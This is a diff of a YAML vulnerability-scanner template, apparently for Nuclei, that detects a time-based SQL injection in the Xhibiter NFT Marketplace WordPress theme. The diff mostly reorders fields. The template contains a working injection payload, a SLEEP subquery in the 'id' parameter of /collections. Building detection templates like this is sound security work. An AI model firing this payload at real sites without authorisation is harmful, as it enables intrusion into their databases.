@@ -1,5 +1,4 @@
 id: xhibiter-nft-sqli
-
 info:
   name: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
   author: ProjectDiscoveryAI
@@ -12,33 +11,28 @@ info:
     - https://x.com/ExploitDB/status/1807782485549560196
   metadata:
     max-request: 2
-  tags: xhibiter,sqli,time-based-sqli,wordpress,wp-theme,xhibiter,nft,vuln
-
+    publicwww-query: /wp-content/themes/xhibiter/
+  tags: nft,sqli,time-based-sqli,vuln,wordpress,wp-theme,xhibiter,xhibiter
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - internal: true
+        part: body
+        type: word
+        words:
+          - /wp-content/themes/xhibiter/
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '/wp-content/themes/xhibiter/'
-        internal: true
-
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - status_code == 200
+          - duration>=7
+        type: dsl
+    matchers-condition: and
+    raw:
       - |
         GET /collections?id=2'+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+'KEOa'='KEOa HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-          - 'duration>=7'
-        condition: and
-
